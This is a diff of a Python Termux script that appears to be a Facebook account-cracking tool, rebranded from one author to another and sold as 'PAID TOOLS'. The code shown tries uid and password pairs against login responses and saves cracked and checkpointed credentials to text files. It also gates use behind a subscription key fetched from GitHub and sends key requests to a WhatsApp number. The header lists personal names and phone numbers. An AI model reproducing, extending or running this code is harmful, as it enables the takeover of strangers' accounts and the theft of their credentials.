@@ -400,13 +400,11 @@ logo = ("""\033[1;32m
              
 _______________________________________
 _______________ಠ_ಠ____________________  
-[√] Auther      :  MR RAJ XHØWDHÛRŸ
-[√] Group        :  BLACK CYBER 405 :)
-[√] Facebook    :  MR RAJ XHØWDHÛRŸ
-[√] WhatsApp     : +8801932804722
-[√] Status      : RAJ BOSS TOOLS
+[√] Auther      :  Alamin Haque Masud
+[√] Facebook    :  Alamin.Hatake.007
+[√] Status      : PAID TOOLS
 
-     [[ MR RAJ CHOWDHURY ]] 
+     [[ THE HATAKE ]] 
 _________________♲︎____________________     
 _______________________________________\033[1;37m""")
 
@@ -1284,12 +1282,12 @@ class Main:
 				print("\r \033[0;92m[ Mr-Raj-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Mr-Raj-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ALAMIN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ Mr-Raj-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MR-RAJ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ALAMIN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1301,7 +1299,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get(" https://github.com/Rajchowdhury798/akash-aprovel.txt ").text
+	r1=requests.get(" https://github.com/alamin0069/alamin007-approval.txt/blob/main/Alamin0007-approval.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1329,7 +1327,7 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+8801932804722?text=' + tks)
+		os.system('am start https://wa.me/+8801875021388?text=' + tks)
 		Subscraption() 
 	
 Subscraption()
